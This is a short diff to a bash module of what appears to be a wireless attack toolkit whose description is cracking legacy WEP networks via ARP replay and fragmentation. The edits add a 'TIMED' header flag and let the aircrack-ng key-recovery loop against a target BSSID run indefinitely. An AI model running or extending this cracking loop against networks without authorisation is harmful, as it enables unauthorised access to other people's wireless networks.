@@ -8,6 +8,7 @@
 # DESC="Detect and crack legacy WEP networks via ARP replay and fragmentation"
 # REQS="monitor_iface,target_bssid,target_channel"
 # PCAP="yes"
+# TIMED="yes"
 # DECODE="wifi_mgmt"
 
 #===============================================================================
@@ -60,7 +61,7 @@ if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
     CAP_FILE="${OUTPUT_BASE}-01.cap"
     ELAPSED=0
     SUCCESS=0
-    while [[ $ELAPSED -lt $SCAN_TIME ]]; do
+    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
         sleep 30; ((ELAPSED+=30))
         if [[ -f "$CAP_FILE" ]]; then
             if aircrack-ng -b "$BSSID" "$CAP_FILE" 2>&1 | tee "$KEY_FILE" | grep -q "KEY FOUND"; then
@@ -82,7 +83,7 @@ else
         CAP_FILE="${OUTPUT_BASE}-01.cap"
         ELAPSED=0
         SUCCESS=0
-        while [[ $ELAPSED -lt $SCAN_TIME ]]; do
+        while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
             sleep 30; ((ELAPSED+=30))
             if [[ -f "$CAP_FILE" ]]; then
                 if aircrack-ng -b "$BSSID" "$CAP_FILE" > "$KEY_FILE" 2>&1 && grep -q "KEY FOUND" "$KEY_FILE"; then
